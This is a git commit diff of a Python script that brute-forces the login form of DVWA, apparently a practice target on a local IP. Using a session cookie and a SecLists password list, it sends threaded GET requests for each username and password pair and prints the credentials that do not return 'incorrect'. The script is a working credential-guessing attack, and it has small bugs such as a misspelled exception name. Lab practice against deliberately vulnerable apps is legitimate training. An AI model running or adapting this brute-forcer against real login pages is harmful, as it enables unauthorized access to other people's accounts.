223918d61ff6cd2c1e3d4bc4ffa536955a872f05
Francesco Fuschetto <145748696+FrancescoFuschetto@users.noreply.github.com>
2023-10-18 16:56:50 +0200

    Add files via upload

--- BruteForceHigh.py
+++ BruteForceHigh.py
@@ -1,6 +1,6 @@
 import requests
 from concurrent.futures import ThreadPoolExecutor
-import time
+
 
 
 cookies = {'PHPSESSID' : 'e8c5334e536a83d5a5946d0cf9f16311', 'security' : 'high'}
@@ -30,8 +30,36 @@ with open('1000000-password-seclists.txt','r') as password :
 			response = requests.get(url, cookies=cookies)
 			if ('incorrect' not in response.text):
 				print('username=' + n +',&password=' + p)
-				print(f'Tempo di risposta: {response_time} secondi')	
+					
 				
 		except requests.exceptions.RquestException as e:
 			return f'Error: {e}'
 			
+	with ThreadPoolExecutor(max_workers=num_requests) as executor:
+		
+		for n in nome_utente:
+			for p in passwords:
+			
+				url = '' 
+				url += 'http://192.168.1.64/dvwa/vulnerabilities/brute/?'
+				url += 'username=' + n
+				url += '&password=' +p
+				url += '&Login=Login'
+				
+				urls = url * num_requests
+					
+				executor.submit(send_get_request, url)
+				
+				
+			
+				
+			
+			
+			
+			
+			#print(req.status_code)
+			
+			#print(req.url)
+			
+		
+						
